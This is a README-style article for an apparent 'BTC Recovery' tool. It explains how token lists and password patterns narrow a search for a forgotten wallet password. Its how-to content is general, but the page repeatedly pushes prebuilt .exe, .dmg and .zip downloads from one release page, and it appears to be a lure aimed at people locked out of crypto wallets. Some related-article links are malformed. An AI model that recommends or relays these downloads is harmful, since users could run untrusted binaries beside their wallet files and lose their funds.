<div align="center">
<img src="assets/banner-article.png" alt="Token lists and password patterns">
</div>

# Token lists and password patterns

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

A token list turns a vague memory into a searchable space. Instead of guessing one password at a time, you describe the words you might have used, the separators you liked and the way you capitalised them, and the tool generates every combination and tests each against your file.

## You'll see this if

You remember fragments rather than a string, and a plain dictionary has already failed. That failure is expected: dictionaries contain other people's passwords, while the useful material here is your own vocabulary.

| What you have | What to put in the list | What to expect |
|---|---|---|
| "Something with my dog's name and a year" | the name plus 2- and 4-digit year patterns | a small, fast space |
| "Two words, maybe joined" | both words, with separators allowed and disallowed | a space that finishes |
| "I always capitalised the first letter" | case variants on the first token only | cheap, and often decisive |
| "A phrase with spaces" | words plus space as a separator | moderate, worth running |
| "I don't remember anything" | nothing useful  -  this is the wrong tool for it | no search is possible |
| A list of a thousand common passwords | a plain password list | fast, and rarely right |

## Why it happens

Human-chosen passwords are built from a small alphabet of habits: names, places, dates, a small set of separators, and one of four capitalisation patterns. A token list encodes that alphabet, and a pattern rule encodes the arrangements. Together they cover a space that looks enormous and is actually small.

This is why the technique works when a dictionary does not. A dictionary is a list of what other people chose; a token list is a description of what you chose, and the difference in hit rate is the difference between knowing the person and not. The cost is honest: every extra token multiplies the space, so a list of five words with two separators and three case options is already a serious run, while a list of twenty is usually a waste.

Patterns are where the arithmetic is decided. Allowing any character in any position produces a space nothing finishes; allowing case variants of a known word plus one digit produces one that finishes in minutes. Writing the pattern tighter than the memory is the mistake that wastes an evening, and writing it looser is the mistake that wastes a week: [BTCRecover command-line options](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-command-line-options.md) shows where the list and the pattern are supplied.

## Fix

Describe the password rather than guessing it: build the smallest list that could contain the truth, with the widest pattern you can justify, and test it against a copy of the file.

1. **Write the fragments down before touching the tool.** Names, places, dates, hobbies, the words you reused in that era, in the language you were using.
2. **Add the obvious variants of each**: capitalised, all caps, plural, abbreviated, misspelled the way you misspell it.
3. **Decide the separators you actually used**  -  none, a space, a dot, an underscore, a dash  -  and encode them as options rather than separate runs.
4. **Set the digit patterns narrowly.** A four-digit year range beats "any four digits" by orders of magnitude, and a birth year or house number is worth trying first.
5. **Run the smallest version first.** One token, one separator, one digit pattern. If it finishes empty, widen one axis at a time.
6. **Download the current release from the GitHub releases page** and keep the run offline, on a copy of the file: [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1).
7. **Record the list that worked**, because the same habits will appear in the next wallet you cannot open.

A worked example makes the arithmetic concrete. Three tokens, two separators, four case variants and a four-digit year is roughly 3 x 2 x 4 x 10,000 candidates  -  a space one machine finishes in an evening. Add a fourth token and the same pattern is four times larger; allow any character in any position and it stops being finite. That is why the guidance is to widen one axis at a time, and to write down which axes were already covered so a second run does not simply repeat the first: [Recover a seed phrase with 1-3 missing words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-missing-seed-words.md) applies the same discipline to positions rather than vocabulary.

## If that did not work

If a tight run finishes empty, widen along the axis you are least sure about  -  usually case, then separators, then an extra token  -  rather than adding everything at once.

Two failures look alike and are not. A run that finished quickly and found nothing means the space was small and the answer was outside it; a run that is still going after a day means the space is too wide to finish, and the answer is to narrow the pattern rather than to wait. Reading the progress output tells you which you have: [A recovery run that finds nothing: what to check](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-recovery-failed-what-now.md).

Where the password was a genuinely random string, no list recovers it, and the useful work moves to the artifact: a phrase restore, a backup copy, or an older file with a weaker password. That boundary is real and worth recognising early rather than after a month of compute: [Bitcoin wallet password recovery tool](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/bitcoin-wallet-password-recovery-with-btcrecover.md).

## Prevention

- Use a password manager, so the next forgotten password is a lookup rather than a search.
- Keep a written reminder of the pattern without the value  -  "two words, dot, year"  -  beside the backup.
- Reuse nothing across wallets; a recovered pattern should not unlock everything you own.
- Test that each wallet file opens before it holds a real balance.
- BTCRecover is actively maintained, and the current release is published on the GitHub releases page.

## FAQ

### What is a token list?

A file of the words and fragments your password might be built from. The tool combines them with separators, case variants and digits to generate candidates, which is far more effective than a generic password list.

### How big should a token list be?

As small as honesty allows. Five to fifteen well-chosen tokens cover most real memories; a list of hundreds mostly multiplies the run time without adding the word you actually used.

### Can a token list recover a random password?

No. Random strings have no reusable vocabulary, so there is nothing to enumerate. Lists exploit habits, and a password chosen without habits is outside their reach.

### Does the order of tokens matter?

Yes  -  a token list describes what the words are, while the pattern describes how they are arranged. If the order is uncertain, allow permutations explicitly rather than assuming the first arrangement is right.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [BTCRecover command-line options]([BTCRecover command-line options](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-command-line-options.md))
- [Bitcoin wallet password recovery tool]([Bitcoin wallet password recovery tool](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/bitcoin-wallet-password-recovery-with-btcrecover.md))
- [Electrum wallet password and seed recovery]([Electrum wallet password and seed recovery](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-electrum-wallet-password-recovery.md))
- [A recovery run that finds nothing]([A recovery run that finds nothing: what to check](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-recovery-failed-what-now.md))
